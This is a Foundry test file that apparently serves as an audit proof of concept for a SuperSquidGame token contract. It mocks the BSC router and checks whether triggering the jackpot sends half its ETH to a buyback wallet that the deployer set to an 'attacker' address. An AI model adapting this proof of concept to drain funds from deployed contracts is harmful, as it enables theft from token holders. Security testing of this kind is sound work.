// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SuperSquidGame.sol";

contract MockFactory {
    address public pair;

    constructor(address _pair) {
        pair = _pair;
    }

    function createPair(address, address) external view returns (address) {
        return pair;
    }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }

    function getAmountsOut(uint256, address[] calldata) 
        external 
        pure 
        returns (uint256[] memory amounts) 
    {
        amounts = new uint256[](2);
        amounts[1] = 40000 * 10 ** 18; // 40,000 USDT (18 decimals)
        return amounts;
    }
}

contract MockPair { }

contract SuperSquidGameTest is Test {
    SuperSquidGame token;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    address constant BSC_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        vm.deal(deployer, 100 ether);
        vm.deal(attacker, 10 ether); // Starting ETH for attacker

        // Create mock contracts
        MockPair pair = new MockPair();
        MockFactory factory = new MockFactory(address(pair));
        MockRouter router = new MockRouter(address(factory), address(0));
        
        // Overwrite router implementation
        vm.etch(BSC_ROUTER, address(router).code);

        // Deploy token
        vm.startPrank(deployer);
        token = new SuperSquidGame(deployer);
        token.setBuybackWallet(payable(attacker));
        token.setJackpotHardFeatures(5000, 1); // 50% buyback, 1 wei trigger
        token.enableTrading();
        vm.stopPrank();
    }

    function testJackpotFundsSentToBuybackWallet() public {
        // Capture initial state
        uint256 initialContractBalance = address(token).balance;
        uint256 initialAttackerBalance = attacker.balance;
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Contract ETH Balance:", initialContractBalance);
        console.log("Attacker ETH Balance:", initialAttackerBalance);

        console.log("--- Trigger Actions ---");
        // Fund and trigger jackpot
        vm.prank(deployer);
        token.fundJackpot{value: 1 ether}(0);
        vm.prank(deployer);
        token.transfer(makeAddr("recipient"), 1);
        vm.roll(block.number + 1);
        console.log("Executed: token.fundJackpot and transfer");

        // Capture final state
        uint256 finalContractBalance = address(token).balance;
        uint256 finalAttackerBalance = attacker.balance;
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Contract ETH Balance:", finalContractBalance);
        console.log("Attacker ETH Balance:", finalAttackerBalance);
        
        // Validate changes
        uint256 contractChange = finalContractBalance - initialContractBalance;
        uint256 attackerChange = finalAttackerBalance - initialAttackerBalance;
        console.log("Contract Change:", contractChange);
        console.log("Attacker Change:", attackerChange);
        
        // Determine vulnerability existence
        if (contractChange == 0.5 ether && attackerChange == 0.5 ether) {
            console.log("Vulnerability Exists: Contract balance decreased by 0.5 ETH and attacker balance increased by 0.5 ETH correctly");
        } else {
            console.log("Vulnerability not Exist: Invalid balance changes indicating no exploitation");
        }
    }
}